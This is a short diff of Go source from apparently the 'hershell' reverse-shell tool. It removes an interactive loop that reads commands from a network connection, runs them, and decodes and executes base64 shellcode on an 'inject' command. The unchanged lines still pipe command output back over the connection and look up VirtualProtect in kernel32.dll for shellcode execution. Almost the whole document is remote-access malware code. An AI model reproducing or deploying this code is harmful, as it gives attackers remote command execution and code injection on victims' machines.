@@ -3,11 +3,8 @@
 package shell
 
 import (
-	"bufio"
-	"encoding/base64"
 	"net"
 	"os/exec"
-	"strings"
 	"syscall"
 	"unsafe"
 )
@@ -25,36 +22,6 @@ func ExecuteCmd(command string, conn net.Conn) {
 	cmd.Stdout = conn
 	cmd.Stderr = conn
 	cmd.Run()
-}
-
-func InteractiveShell(conn net.Conn) {
-	var exit bool = false
-	scanner := bufio.NewScanner(conn)
-
-	conn.Write([]byte("[hershell]>"))
-
-	for scanner.Scan() {
-		command := scanner.Text()
-		if len(command) > 2 {
-			argv := strings.Split(command, " ")
-			switch argv[0] {
-			case "inject":
-				shellcode, err := base64.StdEncoding.DecodeString(argv[1])
-				if err == nil {
-					go ExecShellcode(shellcode)
-				}
-			case "exit":
-				exit = true
-				break
-			default:
-				ExecuteCmd(command, conn)
-			}
-			if exit {
-				break
-			}
-		}
-		conn.Write([]byte("[hershell]>"))
-	}
 }
 
 var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
